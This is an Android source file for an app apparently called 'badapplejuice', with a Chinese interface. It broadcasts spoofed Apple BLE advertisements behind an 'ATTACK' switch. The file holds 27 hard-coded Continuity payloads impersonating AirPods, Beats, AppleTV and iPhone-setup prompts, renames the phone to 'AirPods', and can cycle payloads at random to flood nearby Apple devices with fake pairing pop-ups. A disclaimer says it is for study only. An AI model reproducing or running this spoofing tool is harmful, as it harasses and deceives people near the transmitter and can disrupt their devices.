package cn.sab1e.badapplejuice;

import static android.content.ContentValues.TAG;
import static android.content.pm.PackageManager.PERMISSION_GRANTED;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.annotation.SuppressLint;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.le.AdvertiseCallback;
import android.bluetooth.le.AdvertiseData;
import android.bluetooth.le.AdvertiseSettings;
import android.bluetooth.le.AdvertisingSet;
import android.bluetooth.le.AdvertisingSetCallback;
import android.bluetooth.le.AdvertisingSetParameters;
import android.bluetooth.le.BluetoothLeAdvertiser;
import android.bluetooth.BluetoothManager;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.icu.util.Calendar;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.ParcelUuid;
import android.text.Editable;
import android.text.TextWatcher;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import android.content.Intent;

import java.nio.charset.Charset;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.UUID;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    private BluetoothLeAdvertiser bluetoothLeAdvertiser;
    private BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
    AdvertisingSet currentAdvertisingSet = null;
    public byte[][] deviceData = {
            {0x07, 0x19, 0x07, 0x02, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x13, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x14, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x03, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x11, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x10, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x05, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x06, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x09, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x17, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x12, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x16, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x01, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x20, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x2b, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x0d, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x13, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x27, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x0b, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x09, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x02, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x1e, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    };
    //private byte[][] testData = {{0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00}};
    private String[] deviceNameArr = {
            "AirPods",
            "AirPods Pro",
            "AirPods Max",
            "AirPods",
            "AirPods",
            "AirPods Pro",
            "Powerbeats3",
            "Powerbeats Pro",
            "Beats Solo Pro",
            "Beats Studio Buds",
            "Beats Flex",
            "BeatsX",
            "Beats Solo3",
            "Beats Studio3",
            "Beats Studio Pro",
            "Beats Fit Pro",
            "Beats Studio Buds +",
            "设置AppleTV",
            "配对AppleTV",
            "AppleTV 验证AppleID",
            "AppleTV 隔空投放和HomeKit",
            "AppleTV键盘",
            "正在连接AppleTV",
            "HomePod",
            "设置新iPhone",
            "转移手机号码",
            "测量TV色彩平衡"
    };
    private String helpString = null;
    private int spIndex = 0;
    private boolean deviceIsRandom = false;
    private boolean isStopThread = false;
    private int interval = 160;
    private int txPowerLevel = 1;
    private boolean settingsIsChanged = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Spinner sp_SelectDevice = null;

        sp_SelectDevice = findViewById(R.id.sp_SelectDevice);

        Switch sw_ATTACK = findViewById(R.id.sw_ATTACK);
        Switch sw_RandomDevice = findViewById(R.id.sw_RandomDevice);
        Button btn_help = findViewById(R.id.btn_help);
        Button btn_SetParameter = findViewById(R.id.btn_SetParameter);
        TextView tv_Debug = findViewById(R.id.tv_Debug);
        TextView tv_advState = findViewById(R.id.tv_advState);
        EditText et_Interval = findViewById(R.id.et_Interval);
        EditText et_TxPowerLevel = findViewById(R.id.et_TxPowerLevel);

        Spinner devSpinner = findViewById(R.id.sp_SelectDevice);

        Random random = new Random(100);
        tv_Debug.setMovementMethod(ScrollingMovementMethod.getInstance());

        ArrayAdapter<String> devAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, deviceNameArr);
        sp_SelectDevice.setAdapter(devAdapter);
        sp_SelectDevice.setSelection(0);


        if (bluetoothAdapter != null && bluetoothAdapter.isEnabled()) {
            if (bluetoothAdapter.isMultipleAdvertisementSupported()) {
                bluetoothLeAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser();
            } else {
                Toast.makeText(this, "您的设备不支持BLE广播！错误代码：03", Toast.LENGTH_SHORT).show();
            }
        } else {
            Toast.makeText(this, "您的设备不支持蓝牙！错误代码：04", Toast.LENGTH_SHORT).show();
        }

        String patten = "HH:mm:ss.SSS";
        SimpleDateFormat format = new SimpleDateFormat(patten);

        helpString = "\n当前软件版本号：v"
                + getVersionName()
                + "\n当前设备SDK版本："
                + android.os.Build.VERSION.SDK_INT
                + "\n\n作者：Sab1e\n"
                + "\n程序功能介绍：\n"
                + "\n随机设备：从27个设备中随机选取。\n"
                + "\n发射功率：单位为dBm，取值范围：[-127,1]\n"
                + "\n间隔时间：单位为0.625ms，取值范围：[160,16777215]\n"
                + "\n声明：该软件仅用于学习和交流使用，作者不承担用户使用该软件的任何后果，使用该软件表示用户同意该声明。";
        tv_Debug.setText(helpString);
        //handler处理UI更新
        Handler handler = new Handler() {
            @Override
            public void handleMessage(Message message) {
                super.handleMessage(message);
                switch (message.what) {
                    case 0:
                        tv_advState.setText("@" + format.format(new Date()) + " \t" + deviceNameArr[spIndex] + "\n");
                        break;
                    case 1:
                        tv_advState.setText("广播已停止");
                        break;
                }
            }
        };
        //参数设置时检查输入是否合法
        btn_SetParameter.setOnClickListener(new View.OnClickListener() {
            @SuppressLint("MissingPermission")
            @Override
            public void onClick(View v) {
                int lastInterval = interval;
                int lastTxPowerLevel = txPowerLevel;
                try {
                    interval = Integer.parseInt(et_Interval.getText().toString());
                    txPowerLevel = Integer.parseInt(et_TxPowerLevel.getText().toString());
                    if ((interval >= 160 && interval <= 16777215) && (txPowerLevel >= -127 && txPowerLevel <= 1)) {
                        if (bluePermission()) {
                            if (currentAdvertisingSet != null) {
                                Log.i("BLE", "currentAdvertisingSet modify successful!");
                                settingsIsChanged = false;
                                currentAdvertisingSet.setAdvertisingParameters(new AdvertisingSetParameters.Builder()
                                        .setTxPowerLevel(txPowerLevel)
                                        .setInterval(interval)
                                        .build());
                            }
                            tv_Debug.setText("参数设置成功！\n当前参数：\n\t发射功率：" + txPowerLevel + "dBm\n\t间隔时间：" + (interval * 0.625) + "ms\n\t随机设备：" + deviceIsRandom);
                        }
                    } else {
                        throw new Exception();
                    }
                } catch (Exception e) {
                    interval = lastInterval;
                    txPowerLevel = lastTxPowerLevel;
                    et_Interval.setText(String.valueOf(lastInterval));
                    et_TxPowerLevel.setText(String.valueOf(lastTxPowerLevel));
                    Toast.makeText(MainActivity.this, "输入值不合法，请重新输入！", Toast.LENGTH_SHORT).show();
                }
            }
        });
        btn_help.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                tv_Debug.setText(helpString);
            }
        });
        sw_RandomDevice.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked == true) {
                    deviceIsRandom = true;
                    tv_Debug.setText("参数设置成功！\n当前参数：\n\t发射功率：" + txPowerLevel + "dBm\n\t间隔时间：" + (interval * 0.625) + "ms\n\t随机设备：" + deviceIsRandom);
                } else {
                    deviceIsRandom = false;
                    tv_Debug.setText("参数设置成功！\n当前参数：\n\t发射功率：" + txPowerLevel + "dBm\n\t间隔时间：" + (interval * 0.625) + "ms\n\t随机设备：" + deviceIsRandom);
                }
            }
        });
        sw_ATTACK.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            @SuppressLint("MissingPermission")
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked == true) {
                    isStopThread = false;
                    tv_Debug.setText("");
                    tv_Debug.append("正在进行各项检测");
                    tv_Debug.append(".");
                    if (bluetoothAdapter == null) {
                        tv_Debug.append("\n您的设备不支持蓝牙功能！\n");
                        sw_ATTACK.setChecked(false);
                        return;
                    }
                    tv_Debug.append(".");
                    if (!bluetoothAdapter.isEnabled()) {
                        tv_Debug.append("\n蓝牙已关闭\n请打开蓝牙后重试\n");
                        sw_ATTACK.setChecked(false);
                        return;
                    }
                    tv_Debug.append(".");
                    if (!(bluetoothAdapter.isOffloadedFilteringSupported() ||
                            bluetoothAdapter.isOffloadedScanBatchingSupported() ||
                            bluetoothAdapter.isMultipleAdvertisementSupported())) {
                        tv_Debug.append("\n您的设备不支持BLE广播功能！\n");
                        sw_ATTACK.setChecked(false);
                        return;
                    }
                    tv_Debug.append("\n检测完毕，功能正常！\n");
                    tv_Debug.append("正在获取蓝牙权限...\n");
                    if (bluePermission()) {
                        tv_Debug.append("蓝牙权限获取成功！\n");
                        tv_Debug.append("当前参数：\n\t发射功率：" + txPowerLevel + "dBm\n\t间隔时间：" + (interval * 0.625) + "ms\n\t随机设备：" + deviceIsRandom);
                        interval = Integer.parseInt(et_Interval.getText().toString());
                        txPowerLevel = Integer.parseInt(et_TxPowerLevel.getText().toString());
                        spIndex = devSpinner.getSelectedItemPosition();
                        startAdv(deviceData[spIndex]);
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                while (true) {
                                    try {
                                        //随机设备
                                        if (deviceIsRandom) {
                                            spIndex = random.nextInt(26);
                                            if (currentAdvertisingSet != null) {
                                                Log.i("BLE", "device modify successful!");
                                                currentAdvertisingSet.setAdvertisingData(new AdvertiseData.Builder()
                                                        .addManufacturerData(0x004c, deviceData[spIndex])
                                                        .build());
                                            }
                                        } else {
                                            spIndex = devSpinner.getSelectedItemPosition();
                                        }
                                        handler.sendEmptyMessage(0);
                                        if (isStopThread) {
                                            handler.sendEmptyMessage(1);
                                            stopAdv();
                                            break;
                                        }
                                        Thread.sleep(100);
                                    } catch (InterruptedException e) {
                                        throw new RuntimeException(e);
                                    }
                                }
                            }
                        }).start();
                    } else {
                        tv_Debug.append("\n无权限，请授权后重试！\n");
                        sw_ATTACK.setChecked(false);
                    }
                } else {
                    isStopThread = true;
                }
            }
        });
    }

    //获取当前APP版本
    private String getVersionName() {
        PackageManager packageManager = getPackageManager();
        PackageInfo packInfo = null;
        try {
            packInfo = packageManager.getPackageInfo(getPackageName(), 0);
        } catch (PackageManager.NameNotFoundException e) {
            throw new RuntimeException(e);
        }
        String version = packInfo.versionName;
        return version;
    }
    //获取蓝牙权限
    private boolean bluePermission() {
        Log.i("BLE", "Requesting Bluetooth Permission...");
        if(android.os.Build.VERSION.SDK_INT>30) {
            if (ContextCompat.checkSelfPermission(this,
                    "android.permission.BLUETOOTH_ADVERTISE")
                    != PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(this,
                    "android.permission.BLUETOOTH_CONNECT")
                    != PERMISSION_GRANTED
            ) {
                ActivityCompat.requestPermissions(this, new String[]{
                        "android.permission.BLUETOOTH_ADVERTISE",
                        "android.permission.BLUETOOTH_CONNECT",}, 1);
                return false;
            }
        }else{
            if (ContextCompat.checkSelfPermission(this,
                    "android.permission.ACCESS_FINE_LOCATION")
                    != PERMISSION_GRANTED
            ) {
                ActivityCompat.requestPermissions(this, new String[]{
                        "android.permission.ACCESS_FINE_LOCATION",
                        }, 1);
                return false;
            }
        }
        return true;
    }

    //权限获取结果反馈
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1) {
            if (grantResults[0] != PERMISSION_GRANTED) {
                if(android.os.Build.VERSION.SDK_INT>30) {
                    if (ContextCompat.checkSelfPermission(this, "android.permission.BLUETOOTH_ADVERTISE") != PERMISSION_GRANTED) {
                        Toast.makeText(this, "无权限：BLUETOOTH_ADVERTISE", Toast.LENGTH_SHORT).show();
                    }
                    if (ContextCompat.checkSelfPermission(this, "android.permission.BLUETOOTH_CONNECT") != PERMISSION_GRANTED) {
                        Toast.makeText(this, "无权限：BLUETOOTH_CONNECT", Toast.LENGTH_SHORT).show();
                    }
                }else {
                    if (ContextCompat.checkSelfPermission(this, "android.permission.ACCESS_FINE_LOCATION") != PERMISSION_GRANTED) {
                        Toast.makeText(this, "无权限：android.permission.ACCESS_FINE_LOCATION", Toast.LENGTH_SHORT).show();
                    }
                }
            }
        }
    }

    //停止广播
    @SuppressLint("MissingPermission")
    public void stopAdv() {
        AdvertisingSetCallback advertisingCallback = new AdvertisingSetCallback() {
            @Override
            public void onAdvertisingSetStarted(AdvertisingSet advertisingSet, int txPower, int status) {
                Log.i("BLE", "onAdvertisingSetStarted(): txPower:" + txPower + " , status: "
                        + status);
                currentAdvertisingSet = advertisingSet;
            }

            @Override
            public void onAdvertisingDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onAdvertisingDataSet() :status:" + status);
            }

            @Override
            public void onScanResponseDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onScanResponseDataSet(): status:" + status);
            }

            @Override
            public void onAdvertisingSetStopped(AdvertisingSet advertisingSet) {
                Log.i("BLE", "onAdvertisingSetStopped():");
            }
        };
        if (bluePermission()) {
            bluetoothLeAdvertiser.stopAdvertisingSet(advertisingCallback);
        }
    }

    //开始广播
    @SuppressLint("MissingPermission")
    public void startAdv(byte[] data) {
        AdvertisingSetParameters parameters = new AdvertisingSetParameters.Builder()
                .setLegacyMode(true)
                .setConnectable(false)
                .setInterval(interval)
                .setTxPowerLevel(txPowerLevel)
                .build();
        AdvertiseData Data = new AdvertiseData.Builder()
                .setIncludeDeviceName(false)
                .setIncludeTxPowerLevel(false)
                .addManufacturerData(0x004c, data)
                .build();
        AdvertiseData scanData = new AdvertiseData.Builder()
                .setIncludeTxPowerLevel(true)
                .setIncludeDeviceName(true)
                .build();
        AdvertisingSetCallback advertisingCallback = new AdvertisingSetCallback() {
            @Override
            public void onAdvertisingSetStarted(AdvertisingSet advertisingSet, int txPower, int status) {
                Log.i("BLE", "onAdvertisingSetStarted(): txPower:" + txPower + " , status: "
                        + status);
                currentAdvertisingSet = advertisingSet;
            }

            @Override
            public void onAdvertisingDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onAdvertisingDataSet() :status:" + status);
            }

            @Override
            public void onScanResponseDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onScanResponseDataSet(): status:" + status);
            }

            @Override
            public void onAdvertisingSetStopped(AdvertisingSet advertisingSet) {
                Log.i("BLE", "onAdvertisingSetStopped():");
            }
        };
        if (bluePermission()) {
            Log.d("BLE", "Advertising Successful!");
            bluetoothAdapter.setName("AirPods");
            bluetoothLeAdvertiser.startAdvertisingSet(parameters, Data, scanData, null, null, advertisingCallback);
        } else {
            Log.e("BLE", "Advertising Failed! Need Permission.");
            Toast.makeText(this, "程序需要获取权限！错误代码：02", Toast.LENGTH_SHORT).show();
        }
    }
}